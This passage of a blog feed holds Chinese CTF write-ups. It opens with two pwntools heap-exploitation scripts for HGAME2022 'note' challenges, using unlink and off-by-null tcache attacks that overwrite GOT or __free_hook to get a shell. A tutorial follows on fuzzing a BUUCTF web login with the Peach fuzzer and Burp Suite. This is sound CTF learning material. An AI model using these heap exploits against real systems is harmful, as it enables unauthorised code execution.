class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&quot;./note&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./note&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>, content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, payload</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sh.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">note_addr = <span class="number">0x4040C0</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x20</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x100</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x20</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(note_addr + <span class="number">8</span> - <span class="number">0x18</span>) + p64(note_addr + <span class="number">8</span> - <span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x20</span>) + p64(<span class="number">0x110</span>)</span><br><span class="line">payload += <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">2</span> + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.got[<span class="string">&#x27;atoi&#x27;</span>]) + p64(note_addr) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">edit(<span class="number">1</span>, payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, p64(elf.sym[<span class="string">&#x27;puts&#x27;</span>])[:-<span class="number">1</span>] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">log.success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, p64(system)[:-<span class="number">1</span>] + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="sized-note"><a href="#sized-note" class="headerlink" title="sized_note"></a>sized_note</h3><p>libc2.27 的 off-by-null 模板题。</p><p>exp 如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&quot;./note&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, size, content</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>, content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, payload</span>):</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sh.sendafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="built_in">str</span>(index).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">11</span>):</span><br><span class="line">    add(i, <span class="number">0xF8</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0xF7</span>)</span><br><span class="line">    </span><br><span class="line">add(<span class="number">12</span>, <span class="number">0x60</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, <span class="number">10</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">    </span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0xF0</span> + p64(<span class="number">0x200</span>))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x78</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x78</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">libc_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>] - <span class="number">0x10</span> - <span class="number">0x60</span> log.success(<span class="string">&quot;libc_base=&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_base)))</span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>, <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">delete(<span class="number">12</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>, p64(__free_hook))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x60</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x60</span>, p64(system))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;闲着时就去打了下杭电的 HGAME2022，以为第一周的题目都会蛮简单的，没想到每道题都花了不少功夫，出题人甚至还只是大二学生，顿时感觉到参差了。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="wp" scheme="http://example.com/categories/ctf/wp/"/>
    
    
  </entry>
  
  <entry>
    <title>peach学习及在web领域的应用</title>
    <link href="http://example.com/2022/01/04/peach/"/>
    <id>http://example.com/2022/01/04/peach/</id>
    <published>2022-01-04T10:02:26.000Z</published>
    <updated>2023-02-20T06:22:46.433Z</updated>
    
    <content type="html"><![CDATA[<p>网上关于peach框架的资料少的可怜。最后跟着一位博主的博客学了下来，不过学的是Fuzz Web Api。就是下面的博客。感谢大佬。</p><blockquote><p><a href="https://blog.csdn.net/qq_27446553/article/details/103278465?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-4.no_search_link&spm=1001.2101.3001.4242.3&utm_relevant_index=7">Peach原理简介与实战：以Fuzz Web API为例</a></p></blockquote><p>接下来就简单记录一下今天下午对peach框架的粗浅尝试。</p><h3 id="以下是工作文件夹和成果展示"><a href="#以下是工作文件夹和成果展示" class="headerlink" title="以下是工作文件夹和成果展示"></a>以下是工作文件夹和成果展示</h3><span id="more"></span><p>用于构建peach数据、状态、配置模型的工作文件夹</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/36888/13/19529/96612/63f30d08Feb24adf9/a6aea8c9943dd22f.png" style="zoom:80%;" /><p>终端上跑起来的效果</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/147533/9/35684/456840/63f30d2dF161352fc/a08d0db0bc4af605.png" style="zoom:80%;" /><p>BurpSuite上收到的相应报文</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/98767/29/33250/297091/63f30d0bFb8fb82ca/6bd323358754cd20.png" style="zoom: 80%;" /><h2 id="以BUUCTF上的-HFCTF2020-EasyLogin作测试目标平台"><a href="#以BUUCTF上的-HFCTF2020-EasyLogin作测试目标平台" class="headerlink" title="以BUUCTF上的[HFCTF2020]EasyLogin作测试目标平台"></a>以BUUCTF上的[HFCTF2020]EasyLogin作测试目标平台</h2><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/139096/24/33662/90948/63f30d09Fb4c62a89/64c19668c4ee0bbd.png"  /><h3 id="1-获取请求报文的模板作为login-bin"><a href="#1-获取请求报文的模板作为login-bin" class="headerlink" title="1. 获取请求报文的模板作为login.bin"></a>1. 获取请求报文的模板作为login.bin</h3><p>我们输入用户名和密码后，点击LOGIN按钮，此时客户端就会发送一个请求，在BurpSuite上我们便能拿到该请求模板，如下图。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/146986/39/33790/197181/63f30d09F92d9b534/300bedb499608595.png"  /><p>我们新建一个文件夹，将该模板复制到 login.bin 里，如下图。（可以随意命名，保存为.bin文件即可</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/135662/23/29143/105109/63f30e75F10af121f/30fb22f355f79ada.png" style="zoom: 80%;" /><h3 id="2-根据-bin模板构造数据模型1-my-data-xml"><a href="#2-根据-bin模板构造数据模型1-my-data-xml" class="headerlink" title="2. 根据.bin模板构造数据模型1-my_data.xml"></a>2. 根据.bin模板构造数据模型1-my_data.xml</h3><p>创建一个1-my_data.xml，存放如下代码。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Peach</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://peachfuzzer.com/2012/Peach&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://peachfuzzer.com/2012/Peach ../peach.xsd&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">DataModel</span> <span class="attr">name</span>=<span class="string">&quot;my_data_model&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">DataModel</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">Peach</span>&gt;</span></span><br></pre></td></tr></table></figure><p>其中DataModel元素下放的便是各行的<strong>字符串或符号</strong>，需要区分开来。以前几行为例。token代表是否为特殊符号，像 <strong>‘:’ ‘&amp;’<strong>之类的都要进行区分。mutable意为可变的，也就是该数据模块需要<span style="color:red;font-weight:600">变异</span>的地方。笔者是对</strong>admin</strong>和<strong>password</strong>的值设置可变异。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/143628/18/31276/331864/63f30ed8Fa32d3a88/5a67d3a1bd2bb451.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/49739/34/18962/171555/63f30e66F3b53cfe1/0ae126b36d5a29fe.png" style="zoom:80%;" /><p>构造DataModel是一个比较费力的过程，还好Peach安装包里提供了校验DataModel是否与我们的.bin对应的工具Peach Validator，才让长时间的努力有了效率。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/194622/32/32714/457318/63f30ed7Ff9c6f305/7222cd64af03823e.png" style="zoom: 67%;" /><h3 id="3-构造配置模型2-my-xml-config"><a href="#3-构造配置模型2-my-xml-config" class="headerlink" title="3. 构造配置模型2-my_xml.config"></a>3. 构造配置模型2-my_xml.config</h3><p>需根据目标端口进行配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">PitDefines</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">All</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">IPv4</span> <span class="attr">key</span>=<span class="string">&quot;TargetAddress&quot;</span></span></span><br><span class="line"><span class="tag">  <span class="attr">value</span>=<span class="string">&quot;848e59df-143b-4177-bf5b-c6b70a18e040.node4.buuoj.cn&quot;</span> /&gt;</span></span><br><span class="line">  </span><br><span class="line"><span class="tag">&lt;<span class="name">Range</span> <span class="attr">key</span>=<span class="string">&quot;TargetPort&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">value</span>=<span class="string">&quot;81&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">min</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">max</span>=<span class="string">&quot;65535&quot;</span> /&gt;</span></span><br><span class="line">   </span><br><span class="line"><span class="tag">&lt;<span class="name">Range</span> <span class="attr">key</span>=<span class="string">&quot;Timeout&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">value</span>=<span class="string">&quot;5000&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">min</span>=<span class="string">&quot;0&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">max</span>=<span class="string">&quot;999999&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">All</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">PitDefines</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Peach</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="4-构建状态模型3-my-state-xml"><a href="#4-构建状态模型3-my-state-xml" class="headerlink" title="4. 构建状态模型3-my_state.xml"></a>4. 构建状态模型3-my_state.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Peach</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://peachfuzzer.com/2012/Peach&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://peachfuzzer.com/2012/Peach ../peach.xsd&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- 导入数据模型 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Include</span> <span class="attr">ns</span>=<span class="string">&quot;MyData&quot;</span> <span class="attr">src</span>=<span class="string">&quot;D:\\Fuzz——peach\\MyPeachPit\\1-my_data.xml&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">StateModel</span> <span class="attr">name</span>=<span class="string">&quot;My_State&quot;</span> <span class="attr">initialState</span>=<span class="string">&quot;state_one&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">State</span> <span class="attr">name</span>=<span class="string">&quot;state_one&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Action</span> <span class="attr">type</span>=<span class="string">&quot;output&quot;</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!-- 引用名为my_data_model的ModelData --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">DataModel</span> <span class="attr">ref</span>=<span class="string">&quot;MyData:my_data_model&quot;</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">Data</span> <span class="attr">fileName</span>=<span class="string">&quot;D:\\Fuzz——peach\\MyPeachPit\\login.bin&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Action</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;<span class="name">Action</span> <span class="attr">type</span>=<span class="string">&quot;input&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">DataModel</span> <span class="attr">name</span>=<span class="string">&quot;NULL&quot;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">Blob</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">DataModel</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">Action</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">State</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">StateModel</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">Peach</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5-构建综合模型4-my-integrate-xml"><a href="#5-构建综合模型4-my-integrate-xml" class="headerlink" title="5. 构建综合模型4-my_integrate.xml"></a>5. 构建综合模型4-my_integrate.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Peach</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://peachfuzzer.com/2012/Peach&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://peachfuzzer.com/2012/Peach ../peach.xsd&quot;</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">&lt;!-- 引入状态模型 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Include</span> <span class="attr">ns</span>=<span class="string">&quot;MyState&quot;</span> <span class="attr">src</span>=<span class="string">&quot;D:\\Fuzz——peach\\MyPeachPit\\3-my_state.xml&quot;</span> /&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">Agent</span> <span class="attr">name</span>=<span class="string">&quot;LocalAgent&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Agent</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">Test</span> <span class="attr">name</span>=<span class="string">&quot;Default&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">Agent</span> <span class="attr">ref</span>=<span class="string">&quot;LocalAgent&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">StateModel</span> <span class="attr">ref</span>=<span class="string">&quot;MyState:My_State&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">Publisher</span> <span class="attr">class</span>=<span class="string">&quot;Tcp&quot;</span> <span class="attr">name</span>=<span class="string">&quot;tcp&quot;</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- 为BurpSuite代理ip --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Param</span> <span class="attr">name</span>=<span class="string">&quot;Host&quot;</span> <span class="attr">value</span>=<span class="string">&quot;127.0.0.1&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Param</span> <span class="attr">name</span>=<span class="string">&quot;Port&quot;</span> <span class="attr">value</span>=<span class="string">&quot;8080&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Param</span> <span class="attr">name</span>=<span class="string">&quot;Timeout&quot;</span> <span class="attr">value</span>=<span class="string">&quot;5000&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Publisher</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">Logger</span> <span class="attr">class</span>=<span class="string">&quot;File&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">Param</span> <span class="attr">name</span>=<span class="string">&quot;Path&quot;</span> <span class="attr">value</span>=<span class="string">&quot;##LogPath##&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">Logger</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Test</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Peach</span>&gt;</span></span><br></pre></td></tr></table></figure><p>同时修改BurpSuite上的代理信息，ip和端口不用改，只需将其重定位至目标靶机，如下图。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/191931/20/33255/92329/63f30e6fF8ef6d164/475421ea9573964f.png" style="zoom: 67%;" /><h3 id="6-最后检验测试套是否正确"><a href="#6-最后检验测试套是否正确" class="headerlink" title="6. 最后检验测试套是否正确"></a>6. 最后检验测试套是否正确</h3><p>在其目录下输入以下命令<code>peach 4-my_integrate.xml -1</code>，出现下图就说明配置成功了。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/123158/8/35793/67146/63f3107cF0548a812/8c4610fcb5dc6a2d.png" style="zoom:80%;" /><h3 id="7-开始fuzz"><a href="#7-开始fuzz" class="headerlink" title="7. 开始fuzz"></a>7. 开始fuzz</h3><p>输入命令<code>peach 4-my_integrate.xml -range 1,150000</code></p><p>意为发送15w个变异报文，15w为官方推荐数量。</p><p>注：记得关掉 intercept 截听器，否则得一个个按forward发送请求报文，最后在Http History界面筛选异常报文即可。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>作为一名菜鸡二进制手，学到了挺多的web知识，也挺好。在实践中稍微熟悉了peach框架的构建流程。</p><p>不过也遇到了很多问题，就是”Content-Length”的值的问题，因为长度如果一直是固定的话发送的请求头该怎么进行长度变异？不过在检测报文时还是观察到某些请求报文的”Content-Length”是会改变的，不过是极少数，如下。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/138332/21/29339/258119/63f31074Fab9ff6f9/8a782e9e75153d37.png" style="zoom:80%;" /><p>大部分是缺参数的，如下。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/111442/11/31651/192774/63f31074F6b9a25a5/0c9623296ed13b49.png" style="zoom: 67%;" /><p>打算明天改进一下DataModel这样子。</p><hr><p>隔天实践了一下，发现将bin中和datamodel中的”Content-Length”改大后，就例如我设置了1000，那么我的请求体的长度范围便是[0,1000]，范围设置越大越好。如我所料，变异请求体的长度变化了很多，也印证了我前几天的思考。同时我还修改了参数authorization的值为可变。虽然仍然跑不出异常结果就对了。（当然很有可能是这道题的考点就不在这里）。以下是今天跑出的各类变异请求体。</p><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/32032/12/21330/196376/63f3108fFd6f8f835/a1fa56905ef5b86b.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/106804/13/25217/180378/63f31074F30ae7716/f2c31195589d6f73.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/138287/24/33317/131526/63f3116bF492f304c/deda6ef59252705d.png"  /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/198394/7/30757/129740/63f31146F6a2daa04/160c56927739fa38.png"  /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/110505/27/35272/79810/63f31147F55d19a83/91cc7631539cb7fa.png" style="zoom:80%;" /><img src="https://kjimg10.360buyimg.com/ott/jfs/t1/185169/19/29635/140331/63f31159Ff819f253/47d04247431b6e8f.png"  />]]></content>
    
    
    <summary type="html">&lt;p&gt;网上关于peach框架的资料少的可怜。最后跟着一位博主的博客学了下来，不过学的是Fuzz Web Api。就是下面的博客。感谢大佬。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/qq_27446553/article/details/103278465?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-4.no_search_link&amp;spm=1001.2101.3001.4242.3&amp;utm_relevant_index=7&quot;&gt;Peach原理简介与实战：以Fuzz Web API为例&lt;/a&gt;&lt;/p&gt;
